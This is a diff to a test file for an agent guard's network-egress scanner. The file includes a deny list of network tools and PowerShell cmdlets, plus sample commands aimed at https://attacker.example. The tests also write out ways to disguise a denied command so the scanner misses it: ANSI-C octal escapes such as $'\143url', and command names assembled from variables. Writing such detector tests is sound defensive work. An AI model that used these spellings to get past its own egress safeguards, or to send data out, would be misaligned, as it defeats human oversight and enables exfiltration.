@@ -1,10 +1,16 @@
 import { expect, test } from 'bun:test'
 import { DEFAULT_GUARD_POLICY } from '@zen/core'
-import { findDeniedNetworkEgress } from '../network-egress.ts'
+import { findDeniedNetworkEgress, type NetworkEgressMatch } from '../network-egress.ts'
 import { extractFlatShellCommandSegments } from '../shell-segments.ts'
 
-const DENIED = DEFAULT_GUARD_POLICY.deniedNetworkBinaries
-const findEgress = (command: string) => findDeniedNetworkEgress(command, DENIED)
+const DENIED: string[] = DEFAULT_GUARD_POLICY.deniedNetworkBinaries
+const findEgress = (command: string): NetworkEgressMatch | undefined => findDeniedNetworkEgress(command, DENIED)
+/**
+ * `${…}` built rather than written: a literal `${` inside a quoted JS string reads to
+ * Biome as a botched template literal (`noTemplateCurlyInString`), and these are SHELL
+ * strings handed to the scanner as data. The escapes are `{` and `}`.
+ */
+const braced = (expansionBody: string): string => `$\u007b${expansionBody}\u007d`
 
 // ── the segmenter's [] contract — the deny's fail-closed leg depends on it ────────────────
 // ⚠ A "better" segmenter that returned partial segments for these inputs would silently
@@ -15,7 +21,7 @@ test('command substitution, backticks, heredocs and unterminated quotes yield NO
     'echo `curl https://x`',
     'cat <<EOF\ncurl x\nEOF',
     'echo "unterminated',
-    'echo ${VAR:-curl}',
+    `echo ${braced('VAR:-curl')}`,
   ]) {
     expect(extractFlatShellCommandSegments(unparseable)).toEqual([])
   }
@@ -111,6 +117,31 @@ test('the bare [ test builtin is exempt; QUOTED synthesis chars are literal and 
   expect(findEgress('"cur[l]" https://x')).toBeUndefined()
 })
 
+// The same class, two spellings the round-2 fix missed — found by review, each verified
+// against a real bash before being pinned here.
+test("⚠ an ANSI-C quoted command word is synthesis: $'\\143url' IS curl", () => {
+  // `bash -c "echo $'\143url'"` prints `curl` — the octal escape assembles the name, so
+  // the raw scan can never see it. Denied outright, like the brace and glob spellings.
+  expect(findEgress(String.raw`$'\143url' https://attacker.example`)).toMatchObject({
+    via: 'command-word-synthesis',
+  })
+  // The same spelling defeated the environment-dump deny; this closes that entrance too.
+  expect(findEgress(String.raw`$'\145nv'`)).toMatchObject({ via: 'command-word-synthesis' })
+})
+
+test('⚠ a parameter expansion AT COMMAND POSITION is refused, not scanned', () => {
+  // `P=cur; ${P}l https://x` runs curl. A brace expansion makes the whole command
+  // unsegmentable, so before this it fell through to a raw scan with no contiguous `curl`.
+  expect(findEgress(`P=cur; ${braced('P')}l https://attacker.example`)).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress(`${braced('CMD')} https://x`)).toMatchObject({ via: 'unresolvable' })
+})
+
+test('an expansion in the ARGUMENTS is ordinary shell and still passes', () => {
+  expect(findEgress(`echo "${braced('HOME')}/notes.txt"`)).toBeUndefined()
+  expect(findEgress(`git commit -m "${braced('message')}"`)).toBeUndefined()
+  expect(findEgress(`cp "${braced('SOURCE')}" "${braced('TARGET')}"`)).toBeUndefined()
+})
+
 // ── wrapper indirection (PR #55 review, round 3): the command sits PAST word 1 ────────────
 // `timeout 30 curl …` resolves word 1 cleanly to a benign wrapper and nothing ever looked
 // at word 3. Wrapper mode gives EVERY word of a wrapper-led segment the command-word
@@ -202,7 +233,8 @@ test('git remotes and interpreters are NOT denied — the stated non-coverage', 
 
 // ── the PowerShell path: always coarse ────────────────────────────────────────────────────
 test('powershell cmdlets are denied by the coarse scan regardless of position', () => {
-  const coarse = (command: string) => findDeniedNetworkEgress(command, DENIED, { coarse: true })
+  const coarse = (command: string): NetworkEgressMatch | undefined =>
+    findDeniedNetworkEgress(command, DENIED, { coarse: true })
   expect(coarse('Invoke-WebRequest -Uri https://x')).toMatchObject({ matched: 'invoke-webrequest' })
   expect(coarse('$r = iwr https://x')).toMatchObject({ matched: 'iwr' })
   expect(coarse('Write-Host hello')).toBeUndefined()
